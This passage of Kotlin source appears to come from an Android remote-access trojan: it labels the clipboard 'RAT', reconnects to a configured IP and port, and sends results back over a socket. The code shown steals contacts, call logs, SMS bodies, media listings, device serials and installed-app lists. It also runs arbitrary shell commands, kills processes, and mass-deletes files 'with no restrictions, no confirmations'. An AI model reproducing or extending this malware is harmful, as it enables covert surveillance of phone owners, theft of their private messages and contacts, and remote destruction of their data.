            val itemType = if (file.isDirectory) "directory" else "file"
            val itemCount = if (file.isDirectory) countItems(file) else 1

            // Just delete it - no restrictions, no confirmations
            val success = if (file.isDirectory) {
                deleteRecursiveSimple(file)
            } else {
                file.delete()
            }

            if (success) {
                "SUCCESS: Deleted $itemType '${file.name}'\n" +
                        "Path: ${file.absolutePath}\n" +
                        "Items removed: $itemCount\n" +
                        "Space freed: ${formatFileSize(originalSize)}"
            } else {
                "FAILED: Could not delete ${file.absolutePath}\n" +
                        "Reason: Permission denied or file in use"
            }

        } catch (e: Exception) {
            "ERROR: Delete failed - ${e.message}"
        }
    }

    // Simple recursive delete - just works
    private fun deleteRecursiveSimple(directory: File): Boolean {
        return try {
            var allDeleted = true

            // Get all files and directories
            directory.walkBottomUp().forEach { file ->
                try {
                    if (!file.delete()) {
                        allDeleted = false
                        Log.w(TAG, "Failed to delete: ${file.absolutePath}")
                    }
                } catch (e: Exception) {
                    allDeleted = false
                    Log.w(TAG, "Exception deleting ${file.absolutePath}: ${e.message}")
                }
            }

            allDeleted
        } catch (e: Exception) {
            false
        }
    }

    // Quick size calculation
    private fun calculateTotalSize(directory: File): Long {
        return try {
            var totalSize = 0L
            directory.walkTopDown().forEach { file ->
                if (file.isFile) {
                    totalSize += file.length()
                }
            }
            totalSize
        } catch (e: Exception) {
            0L
        }
    }

    // Quick item count
    private fun countItems(directory: File): Int {
        return try {
            directory.walkTopDown().count()
        } catch (e: Exception) {
            1
        }
    }

    // Enhanced delete with pattern support (bonus feature)
    private fun deleteWithPattern(pattern: String, directory: String = currentDirectory): String {
        return try {
            val dir = File(directory)
            val files = dir.listFiles() ?: return "Cannot read directory: $directory"

            // Convert shell pattern to regex
            val regex = pattern
                .replace(".", "\\.")
                .replace("*", ".*")
                .replace("?", ".")
                .toRegex(RegexOption.IGNORE_CASE)

            val matchingFiles = files.filter { regex.matches(it.name) }

            if (matchingFiles.isEmpty()) {
                return "No files match pattern '$pattern' in $directory"
            }

            var deleted = 0
            var failed = 0
            var totalSize = 0L

            matchingFiles.forEach { file ->
                try {
                    val size = if (file.isFile) file.length() else calculateTotalSize(file)
                    val success = if (file.isDirectory) {
                        deleteRecursiveSimple(file)
                    } else {
                        file.delete()
                    }

                    if (success) {
                        deleted++
                        totalSize += size
                    } else {
                        failed++
                    }
                } catch (e: Exception) {
                    failed++
                }
            }

            "PATTERN DELETE COMPLETE:\n" +
                    "Pattern: '$pattern'\n" +
                    "Location: $directory\n" +
                    "Found: ${matchingFiles.size} items\n" +
                    "Deleted: $deleted items\n" +
                    "Failed: $failed items\n" +
                    "Space freed: ${formatFileSize(totalSize)}"

        } catch (e: Exception) {
            "Pattern delete error: ${e.message}"
        }
    }

    // BONUS: Advanced delete command processor (optional)
    private suspend fun processAdvancedDelete(command: String, socket: Socket) {
        val parts = command.split(" ")

        when {
            // Basic delete
            parts.size == 2 -> {
                val result = deletePathSimple(parts[1])
                sendResponse(result, socket)
            }

            // Pattern delete: delete pattern *.txt
            parts.size == 3 && parts[1] == "pattern" -> {
                val result = deleteWithPattern(parts[2])
                sendResponse(result, socket)
            }

            // Delete in specific directory: delete in /path *.log
            parts.size == 4 && parts[1] == "in" -> {
                val result = deleteWithPattern(parts[3], parts[2])
                sendResponse(result, socket)
            }

            // Show what would be deleted: delete show /path
            parts.size == 3 && parts[1] == "show" -> {
                val result = showDeletePreview(parts[2])
                sendResponse(result, socket)
            }

            else -> {
                sendResponse("Usage:\n" +
                        "delete <path>              --> Delete file or directory\n" +
                        "delete pattern *.ext       --> Delete files matching pattern\n" +
                        "delete in /path *.log      --> Delete pattern in specific directory\n" +
                        "delete show <path>         --> Preview what would be deleted", socket)
            }
        }
    }

    // Quick preview function
    private fun showDeletePreview(path: String): String {
        return try {
            val file = if (path.startsWith("/")) File(path) else File(currentDirectory, path)

            if (!file.exists()) {
                return "Path not found: ${file.absolutePath}"
            }

            if (file.isFile) {
                "WOULD DELETE FILE:\n" +
                        "Name: ${file.name}\n" +
                        "Path: ${file.absolutePath}\n" +
                        "Size: ${formatFileSize(file.length())}\n" +
                        "Modified: ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified()))}"
            } else {
                val itemCount = countItems(file)
                val totalSize = calculateTotalSize(file)

                "WOULD DELETE DIRECTORY:\n" +
                        "Name: ${file.name}\n" +
                        "Path: ${file.absolutePath}\n" +
                        "Contains: $itemCount items\n" +
                        "Total size: ${formatFileSize(totalSize)}\n" +
                        "Modified: ${SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified()))}"
            }

        } catch (e: Exception) {
            "Preview error: ${e.message}"
        }
    }
    private fun createDirectory(dirPath: String): String {
        return try {
            val dir = File(dirPath)
            if (dir.exists()) {
                return "Directory already exists: $dirPath"
            }

            if (dir.mkdirs()) {
                "Directory created successfully: $dirPath"
            } else {
                "Failed to create directory: $dirPath"
            }
        } catch (e: Exception) {
            "Error creating directory: ${e.message}"
        }
    }

    // === SYSTEM OPERATIONS IMPLEMENTATION ===

    private fun getRunningProcesses(): String {
        return try {
            val result = StringBuilder()
            result.append("=== RUNNING PROCESSES ===\n\n")

            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val processes = activityManager.runningAppProcesses

            if (processes != null) {
                for (process in processes) {
                    result.append("PID: ${process.pid}\n")
                    result.append("Name: ${process.processName}\n")
                    result.append("Importance: ${getImportanceString(process.importance)}\n")
                    result.append("UID: ${process.uid}\n")
                    result.append("\n")
                }
            }

            // Also try to get system processes via shell
            try {
                val shellResult = executeShellCommand("ps")
                if (shellResult.isNotEmpty()) {
                    result.append("\n=== SYSTEM PROCESSES (via shell) ===\n")
                    result.append(shellResult)
                }
            } catch (e: Exception) {
                // Shell access might not work
            }

            result.toString()

        } catch (e: Exception) {
            "Error getting processes: ${e.message}"
        }
    }

    private fun killProcess(processName: String): String {
        return try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val processes = activityManager.runningAppProcesses

            var killed = false
            for (process in processes) {
                if (process.processName.contains(processName, ignoreCase = true)) {
                    try {
                        android.os.Process.killProcess(process.pid)
                        killed = true
                    } catch (e: Exception) {
                        // Process might not be killable
                    }
                }
            }

            if (killed) {
                "Process killed: $processName"
            } else {
                "Process not found or cannot be killed: $processName"
            }

        } catch (e: Exception) {
            "Error killing process: ${e.message}"
        }
    }

    private fun executeShellCommand(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = StringBuilder()

            var line: String?
            while (reader.readLine().also { line = it } != null) {
                output.append(line).append("\n")
            }

            val errorReader = BufferedReader(InputStreamReader(process.errorStream))
            var errorLine: String?
            while (errorReader.readLine().also { errorLine = it } != null) {
                output.append("ERROR: ").append(errorLine).append("\n")
            }

            process.waitFor()
            reader.close()
            errorReader.close()

            if (output.isEmpty()) {
                "Command executed (no output)"
            } else {
                output.toString()
            }

        } catch (e: Exception) {
            "Error executing command: ${e.message}"
        }
    }

    private fun pingHost(host: String): String {
        return try {
            val command = "ping -c 4 $host"
            executeShellCommand(command)
        } catch (e: Exception) {
            "Error pinging host: ${e.message}"
        }
    }

    // === DATA ACCESS IMPLEMENTATION ===

    private fun getContactsData(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_CONTACTS required\n"
            }

            val result = StringBuilder()
            result.append("=== CONTACTS ===\n\n")

            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "Unknown"
                        val phone = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: "Unknown"
                        val type = c.getInt(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))

                        result.append("#$count\n")
                        result.append("Name: $name\n")
                        result.append("Phone: $phone\n")
                        result.append("Type: ${getPhoneTypeString(type)}\n")
                        result.append("\n")

                        count++
                        if (count >= 50) {
                            result.append("... (showing first 50 contacts)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.append("No contacts found")
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error reading contacts: ${e.message}\n"
        }
    }

    private fun getInstalledApps(): String {
        return try {
            val result = StringBuilder()
            result.append("=== INSTALLED APPLICATIONS ===\n\n")

            val packageManager = context.packageManager
            val packages = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)

            val sortedPackages = packages.sortedBy { it.loadLabel(packageManager).toString() }

            for ((index, app) in sortedPackages.withIndex()) {
                val appName = app.loadLabel(packageManager).toString()
                val packageName = app.packageName
                val isSystemApp = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0

                try {
                    val packageInfo = packageManager.getPackageInfo(packageName, 0)
                    val version = packageInfo.versionName ?: "Unknown"
                    val installTime = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date(packageInfo.firstInstallTime))

                    result.append("#$index\n")
                    result.append("Name: $appName\n")
                    result.append("Package: $packageName\n")
                    result.append("Version: $version\n")
                    result.append("Type: ${if (isSystemApp) "System" else "User"}\n")
                    result.append("Installed: $installTime\n")
                    result.append("\n")

                    if (index >= 100) {
                        result.append("... (showing first 100 apps)")
                        break
                    }
                } catch (e: Exception) {
                    // Skip apps that can't be queried
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting installed apps: ${e.message}\n"
        }
    }

    // === MEDIA ACCESS IMPLEMENTATION ===

    private fun getPhotosInfo(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_EXTERNAL_STORAGE required\n"
            }

            val result = StringBuilder()
            result.append("=== PHOTOS INFORMATION ===\n\n")

            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.DATA
            )

            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_TAKEN + " DESC"
            )

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val name = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)) ?: "Unknown"
                        val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE))
                        val dateTaken = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
                        val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)) ?: "Unknown"

                        val dateStr = if (dateTaken > 0) {
                            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(dateTaken))
                        } else "Unknown"

                        result.append("#$count\n")
                        result.append("Name: $name\n")
                        result.append("Size: ${formatFileSize(size)}\n")
                        result.append("Date: $dateStr\n")
                        result.append("Path: $path\n")
                        result.append("\n")

                        count++
                        if (count >= 20) {
                            result.append("... (showing first 20 photos)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.append("No photos found")
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting photos info: ${e.message}\n"
        }
    }

    private fun getAudioInfo(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_EXTERNAL_STORAGE required\n"
            }

            val result = StringBuilder()
            result.append("=== AUDIO FILES INFORMATION ===\n\n")

            val projection = arrayOf(
                MediaStore.Audio.Media._ID,
                MediaStore.Audio.Media.DISPLAY_NAME,
                MediaStore.Audio.Media.SIZE,
                MediaStore.Audio.Media.DURATION,
                MediaStore.Audio.Media.ARTIST,
                MediaStore.Audio.Media.DATA
            )

            val cursor = context.contentResolver.query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Audio.Media.DISPLAY_NAME + " ASC"
            )

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val name = c.getString(c.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME)) ?: "Unknown"
                        val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE))
                        val duration = c.getLong(c.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION))
                        val artist = c.getString(c.getColumnIndexOrThrow(MediaStore.Audio.Media.ARTIST)) ?: "Unknown"
                        val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA)) ?: "Unknown"

                        val durationStr = if (duration > 0) {
                            val minutes = duration / 1000 / 60
                            val seconds = (duration / 1000) % 60
                            String.format("%02d:%02d", minutes, seconds)
                        } else "Unknown"

                        result.append("#$count\n")
                        result.append("Name: $name\n")
                        result.append("Artist: $artist\n")
                        result.append("Duration: $durationStr\n")
                        result.append("Size: ${formatFileSize(size)}\n")
                        result.append("Path: $path\n")
                        result.append("\n")

                        count++
                        if (count >= 20) {
                            result.append("... (showing first 20 audio files)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.append("No audio files found")
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting audio info: ${e.message}\n"
        }
    }

    private fun getVideosInfo(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_EXTERNAL_STORAGE required\n"
            }

            val result = StringBuilder()
            result.append("=== VIDEO FILES INFORMATION ===\n\n")

            val projection = arrayOf(
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DURATION,
                MediaStore.Video.Media.DATE_TAKEN,
                MediaStore.Video.Media.DATA
            )

            val cursor = context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Video.Media.DATE_TAKEN + " DESC"
            )

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val name = c.getString(c.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)) ?: "Unknown"
                        val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE))
                        val duration = c.getLong(c.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION))
                        val dateTaken = c.getLong(c.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN))
                        val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)) ?: "Unknown"

                        val durationStr = if (duration > 0) {
                            val minutes = duration / 1000 / 60
                            val seconds = (duration / 1000) % 60
                            String.format("%02d:%02d", minutes, seconds)
                        } else "Unknown"

                        val dateStr = if (dateTaken > 0) {
                            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(dateTaken))
                        } else "Unknown"

                        result.append("#$count\n")
                        result.append("Name: $name\n")
                        result.append("Duration: $durationStr\n")
                        result.append("Size: ${formatFileSize(size)}\n")
                        result.append("Date: $dateStr\n")
                        result.append("Path: $path\n")
                        result.append("\n")

                        count++
                        if (count >= 20) {
                            result.append("... (showing first 20 video files)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.append("No video files found")
                }
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting videos info: ${e.message}\n"
        }
    }

    // === SYSTEM INFO IMPLEMENTATION ===

    private fun getSystemInfo(): String {
        return try {
            val result = StringBuilder()
            result.append("=== SYSTEM INFORMATION ===\n\n")

            // Memory Info
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memoryInfo = ActivityManager.MemoryInfo()
            activityManager.getMemoryInfo(memoryInfo)

            result.append("Memory:\n")
            result.append("  Available: ${formatFileSize(memoryInfo.availMem)}\n")
            result.append("  Total: ${formatFileSize(memoryInfo.totalMem)}\n")
            result.append("  Low Memory: ${memoryInfo.lowMemory}\n")
            result.append("  Threshold: ${formatFileSize(memoryInfo.threshold)}\n\n")

            // Storage Info
            try {
                val internalStats = StatFs(Environment.getDataDirectory().path)
                val externalStats = if (Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) {
                    StatFs(Environment.getExternalStorageDirectory().path)
                } else null

                result.append("Storage:\n")
                result.append("  Internal Total: ${formatFileSize(internalStats.totalBytes)}\n")
                result.append("  Internal Available: ${formatFileSize(internalStats.availableBytes)}\n")

                if (externalStats != null) {
                    result.append("  External Total: ${formatFileSize(externalStats.totalBytes)}\n")
                    result.append("  External Available: ${formatFileSize(externalStats.availableBytes)}\n")
                } else {
                    result.append("  External Storage: Not available\n")
                }
                result.append("\n")
            } catch (e: Exception) {
                result.append("Storage: Error getting storage info\n\n")
            }

            // CPU Info
            try {
                val cpuInfo = executeShellCommand("cat /proc/cpuinfo")
                if (cpuInfo.isNotEmpty()) {
                    result.append("CPU Info:\n")
                    val lines = cpuInfo.split("\n").take(10) // First 10 lines
                    for (line in lines) {
                        if (line.trim().isNotEmpty()) {
                            result.append("  $line\n")
                        }
                    }
                    result.append("\n")
                }
            } catch (e: Exception) {
                result.append("CPU Info: Not available\n\n")
            }

            // System Uptime
            try {
                val uptimeInfo = executeShellCommand("cat /proc/uptime")
                if (uptimeInfo.isNotEmpty()) {
                    val uptime = uptimeInfo.split(" ")[0].toDoubleOrNull()
                    if (uptime != null) {
                        val hours = (uptime / 3600).toInt()
                        val minutes = ((uptime % 3600) / 60).toInt()
                        result.append("System Uptime: ${hours}h ${minutes}m\n\n")
                    }
                }
            } catch (e: Exception) {
                // Ignore
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting system info: ${e.message}\n"
        }
    }

    private fun getNetworkConnections(): String {
        return try {
            val result = StringBuilder()
            result.append("=== NETWORK CONNECTIONS ===\n\n")

            // Get network interfaces
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())

            result.append("Network Interfaces:\n")
            for (intf in interfaces) {
                if (intf.isUp) {
                    result.append("  ${intf.name}: ${intf.displayName}\n")
                    val addresses = Collections.list(intf.inetAddresses)
                    for (addr in addresses) {
                        if (!addr.isLoopbackAddress) {
                            result.append("    ${addr.hostAddress}\n")
                        }
                    }
                }
            }
            result.append("\n")

            // Try to get active connections via shell
            try {
                val netstatOutput = executeShellCommand("netstat -an")
                if (netstatOutput.isNotEmpty()) {
                    result.append("Active Connections:\n")
                    val lines = netstatOutput.split("\n").take(20) // First 20 lines
                    for (line in lines) {
                        if (line.trim().isNotEmpty()) {
                            result.append("  $line\n")
                        }
                    }
                }
            } catch (e: Exception) {
                result.append("Active Connections: Shell access not available\n")
            }

            result.toString()
        } catch (e: Exception) {
            "Error getting network connections: ${e.message}\n"
        }
    }

    // === CLIPBOARD OPERATIONS ===

    private fun setClipboardData(text: String): String {
        return try {
            val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clipData = android.content.ClipData.newPlainText("RAT", text)
            clipboardManager.setPrimaryClip(clipData)
            "Clipboard set successfully"
        } catch (e: Exception) {
            "Error setting clipboard: ${e.message}"
        }
    }

    // === UTILITY FUNCTIONS ===

    private fun formatFileSize(bytes: Long): String {
        val units = arrayOf("B", "KB", "MB", "GB", "TB")
        var size = bytes.toDouble()
        var unitIndex = 0

        while (size >= 1024 && unitIndex < units.size - 1) {
            size /= 1024
            unitIndex++
        }

        return String.format("%.2f %s", size, units[unitIndex])
    }

    private fun getFilePermissions(file: File): String {
        val permissions = StringBuilder()
        permissions.append(if (file.canRead()) "r" else "-")
        permissions.append(if (file.canWrite()) "w" else "-")
        permissions.append(if (file.canExecute()) "x" else "-")
        return permissions.toString()
    }

    private fun getImportanceString(importance: Int): String {
        return when (importance) {
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND -> "Foreground"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_BACKGROUND -> "Background"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_SERVICE -> "Service"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE -> "Visible"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_PERCEPTIBLE -> "Perceptible"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_CANT_SAVE_STATE -> "Can't Save State"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_EMPTY -> "Empty"
            ActivityManager.RunningAppProcessInfo.IMPORTANCE_GONE -> "Gone"
            else -> "Unknown ($importance)"
        }
    }

    private fun getPhoneTypeString(type: Int): String {
        return when (type) {
            ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
            ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
            ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
            ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work Fax"
            ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home Fax"
            ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"
            ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"
            ContactsContract.CommonDataKinds.Phone.TYPE_CUSTOM -> "Custom"
            ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"
            ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE -> "Work Mobile"
            else -> "Unknown"
        }
    }

    // === EXISTING METHODS (Enhanced) ===

    private fun isSocketAlive(socket: Socket): Boolean {
        return try {
            socket.isConnected && !socket.isClosed && !socket.isInputShutdown && !socket.isOutputShutdown
        } catch (e: Exception) {
            false
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork ?: return false
                val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
                val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                val hasValidated = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                hasInternet && hasValidated
            } else {
                @Suppress("DEPRECATION")
                val networkInfo = connectivityManager.activeNetworkInfo
                networkInfo != null && networkInfo.isConnected
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking network: ${e.message}")
            false
        }
    }

    private suspend fun sendResponse(message: String, socket: Socket) {
        try {
            if (!isSocketAlive(socket)) {
                Log.d(TAG, "Socket not alive, cannot send response")
                return
            }

            withContext(Dispatchers.IO) {
                val fullMessage = message + if (!message.endsWith("\n")) "\n" else ""
                outputStream.write(fullMessage.toByteArray(Charsets.UTF_8))
                outputStream.write("END123\n".toByteArray(Charsets.UTF_8))
                outputStream.flush()
            }
            Log.d(TAG, "Response sent: ${message.take(100)}...")
        } catch (e: Exception) {
            Log.e(TAG, "Error sending response: ${e.message}")
        }
    }

    private suspend fun scheduleReconnect() {
        synchronized(this) {
            if (isReconnecting) {
                Log.d(TAG, "Reconnection already in progress")
                return
            }

            if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
                Log.d(TAG, "Max reconnection attempts reached, resetting")
                reconnectAttempts = 0
            }

            isReconnecting = true
            reconnectAttempts++
        }

        val backoffDelay = (BASE_RECONNECT_DELAY * reconnectAttempts).coerceAtMost(60000L)
        val jitter = (1000..3000).random()
        val totalDelay = backoffDelay + jitter

        Log.d(TAG, "Scheduling reconnection #$reconnectAttempts in ${totalDelay}ms")

        delay(totalDelay)

        synchronized(this) {
            isReconnecting = false
        }

        execute(Config.IP, Config.PORT)
    }

    private fun cleanup() {
        try {
            connectionJob?.cancel()
            currentSocket?.close()
            currentSocket = null

            // Clean up audio recording
            if (isRecording) {
                mediaRecorder?.release()
                mediaRecorder = null
                isRecording = false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error during cleanup: ${e.message}")
        }
    }

    // === ORIGINAL DATA METHODS (Enhanced) ===

    private fun getDeviceInfo(): String {
        return try {
            val result = StringBuilder()
            result.append("=== DEVICE INFORMATION ===\n\n")

            // Hardware info
            result.append("Hardware:\n")
            result.append("  Model: ${Build.MODEL}\n")
            result.append("  Manufacturer: ${Build.MANUFACTURER}\n")
            result.append("  Brand: ${Build.BRAND}\n")
            result.append("  Device: ${Build.DEVICE}\n")
            result.append("  Product: ${Build.PRODUCT}\n")
            result.append("  Board: ${Build.BOARD}\n")
            result.append("  Hardware: ${Build.HARDWARE}\n")

            // System info
            result.append("\nSystem:\n")
            result.append("  Android: ${Build.VERSION.RELEASE}\n")
            result.append("  API Level: ${Build.VERSION.SDK_INT}\n")
            result.append("  Fingerprint: ${Build.FINGERPRINT}\n")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                result.append("  Security Patch: ${Build.VERSION.SECURITY_PATCH}\n")
            }

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    result.append("  Serial: ${Build.getSerial()}\n")
                } else {
                    @Suppress("DEPRECATION")
                    result.append("  Serial: ${Build.SERIAL}\n")
                }
            } catch (e: Exception) {
                result.append("  Serial: Not accessible\n")
            }

            // Build info
            result.append("\nBuild:\n")
            result.append("  ID: ${Build.ID}\n")
            result.append("  Display: ${Build.DISPLAY}\n")
            result.append("  Host: ${Build.HOST}\n")
            result.append("  User: ${Build.USER}\n")
            result.append("  Type: ${Build.TYPE}\n")
            result.append("  Tags: ${Build.TAGS}\n")

            result.append("\nMode: Complete Background Shell\n")

            return result.toString()

        } catch (e: Exception) {
            "Device info error: ${e.message}"
        }
    }

    private fun getCallLogsData(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_CALL_LOG required\n"
            }

            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            val result = StringBuilder()
            result.appendLine("=== CALL LOGS ===")
            result.appendLine()

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    result.appendLine("Total calls: ${c.count}")
                    result.appendLine()

                    var count = 0
                    do {
                        val number = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "Unknown"
                        val name = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown"
                        val duration = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                        val type = c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                        val date = c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE))

                        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        val formattedDate = dateFormat.format(Date(date))

                        val callType = when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            CallLog.Calls.MISSED_TYPE -> "Missed"
                            CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
                            CallLog.Calls.REJECTED_TYPE -> "Rejected"
                            CallLog.Calls.BLOCKED_TYPE -> "Blocked"
                            else -> "Unknown"
                        }

                        val formattedDuration = if (duration > 0) {
                            val minutes = duration / 60
                            val seconds = duration % 60
                            String.format("%02d:%02d", minutes, seconds)
                        } else "00:00"

                        result.appendLine("#$count")
                        result.appendLine("Number: $number")
                        result.appendLine("Name: $name")
                        result.appendLine("Type: $callType")
                        result.appendLine("Date: $formattedDate")
                        result.appendLine("Duration: $formattedDuration")
                        result.appendLine()

                        count++
                        if (count >= 50) {
                            result.appendLine("... (showing first 50 calls)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.appendLine("No call logs found")
                }
            }
            result.toString()
        } catch (e: Exception) {
            "Error reading call logs: ${e.message}\n"
        }
    }

    private fun getSMSData(type: String): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_SMS required\n"
            }

            val smsType = when (type.lowercase()) {
                "sent" -> "sent"
                "inbox", "" -> "inbox"
                else -> "inbox"
            }

            val uri = Uri.parse("content://sms/$smsType")
            val cursor = context.contentResolver.query(uri, null, null, null, "date DESC")

            val result = StringBuilder()
            result.appendLine("=== SMS $smsType ===")
            result.appendLine()

            cursor?.use { c ->
                if (c.moveToFirst()) {
                    var count = 0
                    do {
                        val number = c.getString(c.getColumnIndexOrThrow("address")) ?: "Unknown"
                        val date = c.getLong(c.getColumnIndexOrThrow("date"))
                        val body = c.getString(c.getColumnIndexOrThrow("body")) ?: ""
                        val person = c.getString(c.getColumnIndexOrThrow("person"))

                        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        val formattedDate = dateFormat.format(Date(date))

                        result.appendLine("#$count")
                        result.appendLine("Number: $number")
                        result.appendLine("Person: $person")
                        result.appendLine("Date: $formattedDate")
                        result.appendLine("Body: $body")
                        result.appendLine()

                        count++
                        if (count >= 50) {
                            result.appendLine("... (showing first 50 messages)")
                            break
                        }
                    } while (c.moveToNext())
                } else {
                    result.appendLine("No SMS messages found")
                }
